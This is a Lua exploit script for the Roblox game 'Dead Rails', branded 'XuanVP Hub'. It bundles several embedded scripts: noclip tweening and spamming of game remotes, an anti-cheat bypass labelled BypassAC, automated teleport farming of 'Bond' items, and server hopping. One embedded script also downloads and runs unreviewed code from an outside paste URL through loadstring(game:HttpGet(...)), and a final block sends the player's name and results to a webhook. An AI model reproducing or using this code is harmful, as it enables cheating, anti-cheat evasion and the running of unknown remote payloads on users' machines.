local game = game local HttpService = game:GetService("HttpService") local Players = game:GetService("Players") local RunService = game:GetService("RunService") local function httpGet(url) local success, result = pcall(function() return HttpService:GetAsync(url, true) end) if not success then warn("[HTTP ERROR] Failed to get data from " .. url .. ": " .. tostring(result)) end return success and result or nil end local function executeScript(scriptCode) local fn, err = loadstring(scriptCode) if fn then return pcall(fn) else warn("[EXECUTION ERROR] Failed to loadstring script: " .. tostring(err)) return false, err end end -- Script: queue.lua local queue_script = [[ repeat task.wait() until game:IsLoaded() local lobbyPlaceId = 116495829188952 local TweenService = game:GetService("TweenService") local Players = game:GetService("Players") local ReplicatedStorage = game:GetService("ReplicatedStorage") local TeleportService = game:GetService("TeleportService") local HttpService = game:GetService("HttpService") local player = Players.LocalPlayer local character = player.Character or player.CharacterAdded:Wait() local rootPart = character:WaitForChild("HumanoidRootPart") local pointA = Vector3.new(45, 8, 91) local pointB = Vector3.new(45, 8, 154) local moveSpeed = 21 local function enableNoClip() for _, part in pairs(character:GetDescendants()) do if part:IsA("BasePart") and part.CanCollide then part.CanCollide = false end end end local function tweenToPosition(targetPosition) local distance = (rootPart.Position - targetPosition).Magnitude local timeToMove = distance / moveSpeed local tweenInfo = TweenInfo.new(timeToMove, Enum.EasingStyle.Linear, Enum.EasingDirection.Out) local tween = TweenService:Create(rootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)}) tween:Play() return tween end local function fireCreatePartyRemote() while true do local args = { { trainId = "default", maxMembers = 1, gameMode = "Normal" } } print("Firing CreateParty remote with args:", args) local createPartyRemote = ReplicatedStorage:WaitForChild("Shared", 10):WaitForChild("Network", 10):WaitForChild("RemoteEvent", 10):WaitForChild("CreateParty", 10) if createPartyRemote then pcall(function() createPartyRemote:FireServer(unpack(args)) end) else warn("CreateParty remote not found!") end task.wait(0.1) end end local function hasBeenTeleported() return game.PlaceId ~= lobbyPlaceId end local function getLowPlayerServer(cursor) warn("Attempting to fetch server list - This may not work on client-side exploits.") local apiUrl = "https://games.roblox.com/v1/games/" .. lobbyPlaceId .. "/servers/Public?sortOrder=Asc&limit=100" local url = apiUrl .. ((cursor and "&cursor=" .. cursor) or "") local success, response = pcall(function() return game:HttpGet(url) end) if success then local data = HttpService:JSONDecode(response) for _, server in pairs(data.data) do if server.playing < 3 and server.id ~= game.JobId then return server.id end end return data.nextPageCursor end warn("Failed to fetch server list.") return nil end local function startTeleportationLoop() enableNoClip() while not hasBeenTeleported() do local tweenA = tweenToPosition(pointA) tweenA.Completed:Wait() if hasBeenTeleported() then break end local tweenB = tweenToPosition(pointB) tweenB.Completed:Wait() if hasBeenTeleported() then break end end print("Successfully Teleported. Stopping teleportation & remote firing.") end if game.PlaceId == lobbyPlaceId then task.spawn(fireCreatePartyRemote) task.spawn(startTeleportationLoop) task.spawn(function() task.wait(35) if game.PlaceId == lobbyPlaceId then warn("Attempting server hop (requires HttpGet, may fail on client)...") local serverId, cursor = nil, nil repeat cursor = getLowPlayerServer(cursor) if cursor and not serverId then serverId = cursor end task.wait(0.5) until serverId or not cursor if serverId then print("Teleporting to a low-player server...") pcall(function() TeleportService:TeleportToPlaceInstance(lobbyPlaceId, serverId, player) end) else warn("No suitable server found or failed to fetch server list.") end else print("Not in the lobby, skipping server hop.") end end) else print("Not in the local lobby. Script will not run fully.") end ]] -- Script: ak.lua local ak_script = [[ local Players = game:GetService("Players") local Debris = game:GetService("Debris") local Workspace = game:GetService("Workspace") local RunService = game:GetService("RunService") local Camera = Workspace.CurrentCamera local LocalPlayer = Players.LocalPlayer local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() local Humanoid = Character:WaitForChild("Humanoid", 10) if not Humanoid then warn("Humanoid not found!") return end pcall(function() Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false) end) local RuntimeItems = Workspace:WaitForChild("RuntimeItems", 10) if not RuntimeItems then warn("RuntimeItems not found!") end function UpdateCamera() if Camera and Camera.CameraType == Enum.CameraType.Track then Camera.CameraType = Enum.CameraType.Custom end end function HandleSit(SeatTarget) if SeatTarget and Humanoid then pcall(function() SeatTarget:Sit(Humanoid) end) end if SeatTarget and SeatTarget.Parent and SeatTarget.Parent.Name == "MaximGun" then pcall(function() Debris:AddItem(SeatTarget.Parent, 0) end) end end function BypassAC() if RuntimeItems then local MaximGun = RuntimeItems:FindFirstChild("MaximGun") if MaximGun then local vehicleSeat = MaximGun:FindFirstChildWhichIsA("VehicleSeat",true) if vehicleSeat then HandleSit(vehicleSeat) end end end if not (RuntimeItems and RuntimeItems:FindFirstChild("MaximGun")) then for i, v in pairs(Workspace:GetDescendants()) do if v.Name == "MaximGun" and v:FindFirstChildWhichIsA("VehicleSeat",true) then HandleSit(v:FindFirstChildWhichIsA("VehicleSeat",true)) end end end end if Camera then pcall(function() Camera:GetPropertyChangedSignal("CameraType"):Connect(UpdateCamera) end) UpdateCamera() end RunService.Heartbeat:Connect(function() if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then BypassAC() end end) ]] -- Script: erj.lua local erj_script = [[ local positions = { Vector3.new(57, 3, 30000), Vector3.new(57, 3, 28000), Vector3.new(57, 3, 26000), Vector3.new(57, 3, 24000), Vector3.new(57, 3, 22000), Vector3.new(57, 3, 20000), Vector3.new(57, 3, 18000), Vector3.new(57, 3, 16000), Vector3.new(57, 3, 14000), Vector3.new(57, 3, 12000), Vector3.new(57, 3, 10000), Vector3.new(57, 3, 8000), Vector3.new(57, 3, 6000), Vector3.new(57, 3, 4000), Vector3.new(57, 3, 2000), Vector3.new(57, 3, 0), Vector3.new(57, 3, -2000), Vector3.new(57, 3, -4000), Vector3.new(57, 3, -6000), Vector3.new(57, 3, -8000), Vector3.new(57, 3, -10000), Vector3.new(57, 3, -12000), Vector3.new(57, 3, -14000), Vector3.new(57, 3, -16000), Vector3.new(57, 3, -18000), Vector3.new(57, 3, -20000), Vector3.new(57, 3, -22000), Vector3.new(57, 3, -24000), Vector3.new(57, 3, -26000), Vector3.new(57, 3, -28000), Vector3.new(57, 3, -30000), Vector3.new(57, 3, -32000), Vector3.new(57, 3, -34000), Vector3.new(57, 3, -36000), Vector3.new(57, 3, -38000), Vector3.new(57, 3, -40000), Vector3.new(57, 3, -42000), Vector3.new(57, 3, -44000), Vector3.new(57, 3, -46000), Vector3.new(57, 3, -48000), Vector3.new(57, 3, -49032) } local duration = 0.9 local bondPauseDuration = 0.9 local player = game.Players.LocalPlayer local char = player.Character or player.CharacterAdded:Wait() local hrp = char:WaitForChild("HumanoidRootPart", 10) if not hrp then warn("HumanoidRootPart not found!") return end local PlayerGui = player:FindFirstChildOfClass("PlayerGui") local screenGui = Instance.new("ScreenGui") if PlayerGui then screenGui.Parent = PlayerGui else warn("PlayerGui not found!") end --ở đây nha task.spawn(function() task.wait(1) if screenGui and screenGui.Parent then screenGui:Destroy() end end) local foundBonds = {} local bondCount = 0 local function updateBondCount() if bondCounter and bondCounter.Parent then bondCounter.Text = "Bonds Found: " .. tostring(bondCount) end end local function safeTeleport(position) if hrp then pcall(function() hrp.CFrame = CFrame.new(position) end) end end local RuntimeItems_erj = workspace:WaitForChild("RuntimeItems", 10) if not RuntimeItems_erj then warn("RuntimeItems not found for erj_script!") end task.spawn(function() if hrp then for _, pos in ipairs(positions) do safeTeleport(pos) task.wait(duration) if pos == Vector3.new(57.00, 3.00, -49032) then warn("Attempting to load external script after final position - This will likely fail on client.") print("Reached final position, waiting 15 seconds...") task.wait(15) local success, err = pcall(function() loadstring(game:HttpGet("https://hst.sh/raw/nawinocofa"))() end) if success then print("Executed loadstring after 15 seconds.") else warn("Failed to execute loadstring after final position: " .. tostring(err)) end end if RuntimeItems_erj then local bonds = RuntimeItems_erj:GetChildren() for _, bond in ipairs(bonds) do if bond:IsA("Model") and bond.PrimaryPart and (bond.Name == "Bond" or bond.Name == "Bonds") then local bondPos = bond.PrimaryPart.Position local alreadyVisited = false for _, storedPos in ipairs(foundBonds) do if (bondPos - storedPos).Magnitude < 1 then alreadyVisited = true break end end if not alreadyVisited then table.insert(foundBonds, bondPos) bondCount = bondCount + 1 safeTeleport(bondPos) print("Bond found! Teleporting to " .. tostring(bondPos)) task.wait(bondPauseDuration) updateBondCount() safeTeleport(pos) end end end end end end end) task.spawn(function() task.wait(2) if RuntimeItems_erj and hrp then while true do task.wait(0.1) local items = RuntimeItems_erj for _, bond in pairs(items:GetChildren()) do if bond:IsA("Model") and bond.Name == "Bond" and bond.PrimaryPart then local dist = (bond.PrimaryPart.Position - hrp.Position).Magnitude if dist < 100 then local activateObjectRemote = game:GetService("ReplicatedStorage"):WaitForChild("Shared", 10):WaitForChild("Network", 10):WaitForChild("RemotePromise", 10):WaitForChild("Remotes", 10):WaitForChild("C_ActivateObject", 10) if activateObjectRemote then pcall(function() activateObjectRemote:FireServer(bond) end) print("Đang nhặt:", bond.Name) else warn("C_ActivateObject remote not found!") end end end end end end end) ]] -- Script: lowserver.lua local lowserver_script = [[ repeat task.wait() until game:IsLoaded() local lobbyPlaceId = 116495829188952 local Players = game:GetService("Players") local TeleportService = game:GetService("TeleportService") local HttpService = game:GetService("HttpService") local player = Players.LocalPlayer local function getLowPlayerServer(cursor) warn("Attempting to fetch server list for lowserver_script - This may not work on client-side exploits.") local apiUrl = "https://games.roblox.com/v1/games/" .. lobbyPlaceId .. "/servers/Public?sortOrder=Asc&limit=100" local url = apiUrl .. ((cursor and "&cursor=" .. cursor) or "") local success, response = pcall(function() return game:HttpGet(url) end) if success then local data = HttpService:JSONDecode(response) for _, server in pairs(data.data) do if server.playing < 3 and server.id ~= game.JobId then return server.id end end return data.nextPageCursor end warn("Failed to fetch server list in lowserver_script.") return nil end local function teleportToLowPlayerServer() warn("Attempting server hop in lowserver_script (requires HttpGet, may fail on client)...") local serverId, cursor = nil, nil repeat cursor = getLowPlayerServer(cursor) if cursor and not serverId then serverId = cursor end task.wait(0.5) until serverId or not cursor if serverId then print("Teleporting to a low-player server from lowserver_script...") pcall(function() TeleportService:TeleportToPlaceInstance(lobbyPlaceId, serverId, player) end) else warn("No suitable server found or failed to fetch server list in lowserver_script.") end end while true do teleportToLowPlayerServer() task.wait(5) end ]] -- Loader: Utility functions local function loadHealthScript() -- Executes lowserver.lua when health is low warn("[SYSTEM] Health low - executing embedded lowserver_script.") executeScript(lowserver_script) end local function loadDeathScript() -- Executes lowserver.lua on player death warn("[SYSTEM] Player died - executing death script (embedded).") executeScript(lowserver_script) end -- Loader: Main script execution local function loadMainScripts() warn("[SYSTEM] Loading main embedded scripts.") coroutine.wrap(executeScript)(queue_script) coroutine.wrap(executeScript)(ak_script) coroutine.wrap(executeScript)(erj_script) end -- Loader: Event monitoring (Health, Died, Tool) local function monitorPlayer() local player = Players.LocalPlayer local character = player.Character or player.CharacterAdded:Wait() local humanoid = character:WaitForChild("Humanoid", 10) if not humanoid then warn("[MONITOR ERROR] Humanoid not found for monitoring.") return end humanoid.HealthChanged:Connect(function() if humanoid.Health > 0 and humanoid.Health < (humanoid.MaxHealth * 0.3) then warn("[SYSTEM] Health low - executing emergency script.") loadHealthScript() end end) humanoid.Died:Connect(function() warn("[SYSTEM] Player died - executing death script.") loadDeathScript() end) local workspaceChildAddedConnection = game:GetService("Workspace").ChildAdded:Connect(function(child) if player.Character and child:IsA("Tool") and child:IsDescendantOf(player.Character) then warn("[SYSTEM] Tool detected within character - ak_script should be running.") end end) player.AncestryChanging:Connect(function(_, parent) if not parent and workspaceChildAddedConnection then workspaceChildAddedConnection:Disconnect() warn("[SYSTEM] Player leaving, disconnected workspace.ChildAdded.") end end) end -- Loader: Initialization and Environment Cleanup local function initialize() if not RunService:IsStudio() then warn("[SYSTEM] Initializing outside Studio.") loadMainScripts() task.spawn(function() local success, err = pcall(monitorPlayer) if not success then warn("[ERROR] Monitoring failed: " .. tostring(err)) else print("[SYSTEM] Player monitoring started.") end end) else warn("[WARNING] Script disabled in Studio mode") end end initialize() pcall(function() getfenv().script = nil end) pcall(function() getfenv().plugin = nil end) pcall(function() getfenv().loadstring = nil end) pcall(function() getfenv().HttpGet = nil end)

-- embed
local HttpService = game:GetService("HttpService")
local player = game:GetService("Players").LocalPlayer
local username = player and player.Name or "Unknown"

local data = {
    ["embeds"] = {{
        ["title"] = "Dead Rails",
        ["description"] = string.format("User: **%s** Đã Nhặt Bond Thành Công!", username),
        ["fields"] = {{
            ["name"] = "Số Bond Đã Nhặt:",
            ["value"] = tostring(#foundBonds),
            ["inline"] = false
        }},
        ["color"] = 0x2F3136, -- Discord dark theme color
        ["footer"] = {
            ["text"] = "XuanVP Hub | " .. os.date("%H:%M:%S")
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }},
    ["username"] = "XuanVP",
    ["avatar_url"] = "https://i.imgur.com/AfFp7pu.png" -- Tùy Có Thể Chọn Link Khác
}

local headers = {["Content-Type"] = "application/json"}
local body = HttpService:JSONEncode(data)
local webhookURL = _G.url or "https://your.webhook.url/here" -- nhập  hoặc set _G.url

if syn and syn.request then
    syn.request({Url = webhookURL, Method = "POST", Headers = headers, Body = body})
elseif http and http.request then
    http.request({Url = webhookURL, Method = "POST", Headers = headers, Body = body})
elseif request then
    request({Url = webhookURL, Method = "POST", Headers = headers, Body = body})
else
    warn("No HTTP request method available. Try a different executor.")
end
